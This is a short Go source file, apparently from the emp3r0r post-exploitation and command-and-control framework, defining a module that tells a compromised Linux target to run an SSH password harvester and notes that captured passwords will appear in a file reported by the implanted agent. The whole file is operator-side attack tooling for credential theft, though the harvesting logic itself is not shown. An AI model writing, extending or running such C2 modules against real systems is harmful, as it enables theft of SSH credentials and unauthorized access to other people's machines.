//go:build linux
// +build linux

package cc

import emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"

func module_ssh_harvester() {
	if CurrentTarget == nil {
		LogError("CurrentTarget is nil")
		return
	}
	err := SendCmdToCurrentTarget(emp3r0r_def.C2CmdSSHHarvester, "")
	if err != nil {
		LogError("SendCmd: %v", err)
		return
	}
	LogMsg("Passwords will show up in the file path given by agent")
}
